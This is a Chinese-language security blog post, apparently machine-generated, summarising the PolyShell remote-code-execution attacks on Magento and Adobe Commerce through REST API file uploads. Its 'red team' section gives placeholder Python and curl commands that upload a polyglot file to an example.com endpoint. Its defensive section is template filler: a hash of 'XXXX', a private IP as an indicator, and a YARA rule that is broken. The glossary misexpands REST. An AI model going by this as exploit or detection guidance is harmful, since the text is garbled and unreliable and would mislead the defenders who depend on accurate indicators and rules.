---
layout: post
title:  "PolyShell attacks target 56% of all vulnerable Magento stores"
date:   2026-03-26 01:48:10 +0000
categories: [security]
severity: critical
---

# 🚨 解析 PolyShell 攻擊：Magento Open Source 和 Adobe Commerce 的遠程代碼執行漏洞

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: 遠程代碼執行 (RCE)
> * **關鍵技術**: `Polyglot 文件`, `REST API`, `WebRTC`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)

* **Root Cause**: 漏洞源於 Magento 的 REST API 接受文件上傳作為購物車項目的自訂選項的一部分，允許 polyglot 文件實現遠程代碼執行或帳戶接管，假設 Web 伺服器配置允許。
* **攻擊流程圖解**:
  1. 攻擊者上傳 polyglot 文件至 Magento 的 REST API。
  2. 文件被儲存至伺服器。
  3. 攻擊者利用文件實現遠程代碼執行或帳戶接管。
* **受影響元件**: Magento Open Source 和 Adobe Commerce 安裝，版本 2.x。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)

* **攻擊前置需求**: 攻擊者需要知道目標的 Magento 安裝版本和 REST API 端點。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 上傳 polyglot 文件
    file = {'file': open('polyglot_file.txt', 'rb')}
    response = requests.post('https://example.com/rest/V1/customOptions', files=file)
    
    # 實現遠程代碼執行或帳戶接管
    if response.status_code == 200:
        print("Payload delivered successfully")
    
    ```
  *範例指令*: 使用 `curl` 上傳 polyglot 文件至 Magento 的 REST API。

```

bash
curl -X POST \
  https://example.com/rest/V1/customOptions \
  -H 'Content-Type: application/octet-stream' \
  -T polyglot_file.txt

```
* **繞過技術**: 攻擊者可以使用 WebRTC 來繞過安全控制，例如 Content Security Policy (CSP)。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)

* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| XXXX | 192.168.1.100 | example.com | /rest/V1/customOptions |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Magento_PolyShell {
      meta:
        description = "Detects Magento PolyShell attacks"
        author = "Your Name"
      strings:
        $a = "polyglot_file.txt"
      condition:
        $a at entry_point
    }
    
    ```
  或者是具體的 SIEM 查詢語法 (Splunk/Elastic)。

```

sql
index=magento_logs (eventtype="rest_api" AND src_ip="192.168.1.100" AND uri_path="/rest/V1/customOptions")

```
* **緩解措施**: 更新 Magento 至最新版本，配置 Web 伺服器以拒絕 polyglot 文件上傳。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)

* **Polyglot 文件 (Polyglot File)**: 一種可以被多種不同的解析器或編譯器解析的文件，例如同時包含 HTML 和 PHP 代碼的文件。
* **REST API (Representational State of Resource)**: 一種設計風格，用于創建網絡服務，例如 Magento 的 REST API。
* **WebRTC (Web Real-Time Communication)**: 一種實時通信技術，允許瀏覽器之間直接通信，例如使用 WebRTC 來繞過安全控制。

## 5. 🔗 參考文獻與延伸閱讀

- [原始報告](https://www.bleepingcomputer.com/news/security/polyshell-attacks-target-56-percent-of-all-vulnerable-magento-stores/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


